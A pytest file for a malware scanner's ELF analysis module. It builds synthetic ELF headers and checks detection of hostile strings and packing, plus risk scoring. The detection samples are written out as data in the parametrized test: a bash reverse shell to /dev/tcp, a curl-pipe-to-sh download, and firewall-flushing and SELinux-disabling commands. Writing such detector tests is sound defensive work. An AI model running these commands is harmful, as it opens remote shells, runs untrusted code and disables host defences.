"""4.4.0-beta.2: Linux ELF triage. Every sample is built here from a minimal header
plus harmless strings; nothing is executed."""

import os
import random
import shutil
import struct

import pytest

from detectors.elf_analysis import ElfAnalyzer, is_elf
from detectors.scoring import ScoringMatrix
from tests.test_scanner_integration import _indicators, scanner  # noqa: F401  (fixture)

PT_LOAD, PT_INTERP = 1, 3


def build_elf(body: bytes = b"", *, bits: int = 64, e_type: int = 2, machine: int = 62,
              interp: bool = True, shnum: int = 12, big_endian: bool = False) -> bytes:
    e = ">" if big_endian else "<"
    ident = b"\x7fELF" + bytes([1 if bits == 32 else 2, 2 if big_endian else 1, 1]) + b"\0" * 9
    ptypes = [PT_INTERP, PT_LOAD] if interp else [PT_LOAD]
    if bits == 64:
        ehsize, phentsize = 64, 56
        header = ident + struct.pack(e + "HHIQQQIHHHHHH", e_type, machine, 1, 0x400000,
                                     ehsize, 0, 0, ehsize, phentsize, len(ptypes), 64, shnum, 0)
        phdrs = b"".join(struct.pack(e + "IIQQQQQQ", t, 5, 0, 0, 0, 0, 0, 0x1000) for t in ptypes)
    else:
        ehsize, phentsize = 52, 32
        header = ident + struct.pack(e + "HHIIIIIHHHHHH", e_type, machine, 1, 0x8048000,
                                     ehsize, 0, 0, ehsize, phentsize, len(ptypes), 40, shnum, 0)
        phdrs = b"".join(struct.pack(e + "IIIIIIII", t, 0, 0, 0, 0, 0, 5, 0x1000) for t in ptypes)
    return header + phdrs + b"\0" * 64 + body


def write(tmp_path, name, data):
    p = tmp_path / name
    p.write_bytes(data)
    return p


def test_header_fields_are_read(tmp_path):
    a = ElfAnalyzer()
    r = a.analyze_file(write(tmp_path, "tool", build_elf(b"hello world strings")))
    assert r.is_elf and r.bits == 64 and r.endian == "little"
    assert r.elf_type == "executable" and r.machine == "x86-64" and r.linking == "dynamic"
    assert not (r.packed or r.no_section_table or r.categories or r.malformed)

    r32 = a.analyze_file(write(tmp_path, "arm", build_elf(bits=32, machine=40, interp=False,
                                                          big_endian=True)))
    assert (r32.bits, r32.endian, r32.machine, r32.linking) == (32, "big", "ARM", "static")


def test_not_an_elf_and_truncated_headers(tmp_path):
    a = ElfAnalyzer()
    assert not a.analyze_file(write(tmp_path, "x.txt", b"plain text")).is_elf
    r = a.analyze_file(write(tmp_path, "short", b"\x7fELF\x02\x01"))
    assert r.is_elf and r.malformed
    assert is_elf(tmp_path / "short") and not is_elf(tmp_path / "x.txt")
    assert not is_elf(tmp_path / "missing")


@pytest.mark.parametrize("category,strings", [
    ("ransom_note", b"All your files have been encrypted. Send 0.1 bitcoin to the wallet"),
    ("miner", b"connecting to stratum+tcp://pool.example.org:3333"),
    ("reverse_shell", b"sh -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'"),
    ("download_exec", b"curl -fsSL http://198.51.100.7/x.sh | sh"),
])
def test_hostile_strings_are_categorised(tmp_path, category, strings):
    r = ElfAnalyzer().analyze_file(write(tmp_path, "bin", build_elf(b"\0" + strings + b"\0")))
    assert category in r.categories


def test_weak_categories_need_two_markers(tmp_path):
    a = ElfAnalyzer()
    one = a.analyze_file(write(tmp_path, "ld", build_elf(b"\0/etc/ld.so.preload\0")))
    assert "persistence" not in one.categories          # the dynamic loader itself has this
    two = a.analyze_file(write(tmp_path, "kit", build_elf(
        b"\0/etc/ld.so.preload\0echo x >> /etc/rc.local\0")))
    assert "persistence" in two.categories
    ev = a.analyze_file(write(tmp_path, "ev", build_elf(b"\0iptables -F\0setenforce 0\0")))
    assert "evasion" in ev.categories


def test_packing_and_removed_section_table(tmp_path):
    a = ElfAnalyzer()
    upx = a.analyze_file(write(tmp_path, "upx", build_elf(b"\0UPX!\x0d\x0c" + b"\0" * 100)))
    assert upx.packed and upx.packer == "UPX"
    rng = random.Random(7)
    noise = bytes(rng.getrandbits(8) for _ in range(64 * 1024))
    rand = a.analyze_file(write(tmp_path, "rnd", build_elf(noise, shnum=0)))
    assert rand.packed and rand.no_section_table and rand.entropy > 7.3
    lib = a.analyze_file(write(tmp_path, "obj.o", build_elf(e_type=1, shnum=0)))
    assert not lib.no_section_table          # only runnable ELFs are expected to have one


def test_scoring_contributions():
    m = ScoringMatrix()
    r = m.score({"elf": {"categories": {"miner": ["xmrig"], "evasion": ["a", "b"]},
                         "packed": True, "packer": "UPX", "no_section_table": True}})
    names = {c.indicator: c.points for c in r.contributions}
    assert names["elf_behaviour"] == 45.0 + 8.0
    assert names["elf_packed"] == 20.0 and names["elf_no_section_table"] == 10.0
    assert r.risk_score == 83 and r.verdict == "Critical"
    assert m.score({"elf": {"categories": {}, "packed": False}}).verdict == "Clean"


def test_scanner_reports_elf_and_skips_other_files(scanner, tmp_path):
    p = write(tmp_path / "scan", "update", build_elf(
        b"\0stratum+tcp://pool.example.org:3333\0--donate-level\0"))
    r = scanner.scan_file(str(p))
    assert r["scan_results"]["elf_analysis"]["behaviour"]["miner"]
    assert "elf_behaviour" in _indicators(r)
    assert r["verdict"] in ("Medium", "High", "Critical")
    txt = write(tmp_path / "scan", "notes.txt", b"hello")
    assert "elf_analysis" not in scanner.scan_file(str(txt))["scan_results"]


@pytest.mark.skipif(not os.path.exists("/bin/ls") or not is_elf(shutil.which("ls") or ""),
                    reason="needs a system ELF binary")
def test_a_real_system_binary_is_not_flagged():
    r = ElfAnalyzer().analyze_file(shutil.which("ls"))
    assert r.is_elf and not r.categories and not r.no_section_table
